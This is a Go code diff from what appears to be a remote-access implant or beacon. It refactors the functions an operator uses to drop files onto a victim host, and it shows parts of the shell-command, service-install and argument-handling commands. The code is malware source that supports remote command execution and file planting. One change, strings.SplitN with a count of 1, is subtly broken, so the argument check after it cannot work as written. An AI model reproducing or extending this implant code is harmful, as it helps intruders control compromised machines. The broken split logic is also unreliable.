@@ -92,28 +92,26 @@ func CmdShell(cmdBuf []byte, Token uintptr, argues map[string]string) ([]byte, e
 	return []byte("[+] command is executing"), nil
 }
 
-func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
+func CmdUpload(cmdBuf []byte, isStart bool) ([]byte, error) {
 	filePath, fileData := ParseCommandUpload(cmdBuf)
 	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-	result, err := Upload(filePathStr, fileData)
-	if err != nil {
-		return nil, err
-	}
-	return result, nil
+	return Upload(filePathStr, fileData, isStart)
 }
 
-func CmdUploadLoop(cmdBuf []byte) ([]byte, error) {
-	filePath, fileData := ParseCommandUpload(cmdBuf)
-	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-	result, err := Upload(filePathStr, fileData)
-	if err != nil {
-		return nil, err
+func Upload(filePath string, fileContent []byte, isStart bool) ([]byte, error) {
+	var fp *os.File
+	var err error
+	if isStart {
+		// if file exist, need user delete it manually before upload
+		_, err = os.Stat(filePath)
+		if err != nil && os.IsNotExist(err) {
+			fp, err = os.OpenFile(filePath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
+		} else {
+			return nil, errors.New("file already exist")
+		}
+	} else {
+		fp, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, os.ModePerm)
 	}
-	return result, nil
-}
-
-func Upload(filePath string, fileContent []byte) ([]byte, error) {
-	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
 	if err != nil {
 		return nil, errors.New("file create err: " + err.Error())
 	}
@@ -680,7 +678,7 @@ func CmdService(Token uintptr, argues map[string]string) ([]byte, error) {
 	currentFile, _ := os.Executable()
 
 	go func() {
-		_, err := Upload(filePath, data)
+		_, err := Upload(filePath, data, false)
 		if err != nil {
 			communication.ErrorProcess(err)
 			return
@@ -758,7 +756,7 @@ func CmdArgueAdd(argues map[string]string, b []byte) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	argue := strings.Split(string(argueBytes), " ")
+	argue := strings.SplitN(string(argueBytes), " ", 1)
 	_, exist := argues[argue[0]]
 	if exist && len(argue) == 2 {
 		return []byte(argue[0] + " has been declared."), nil
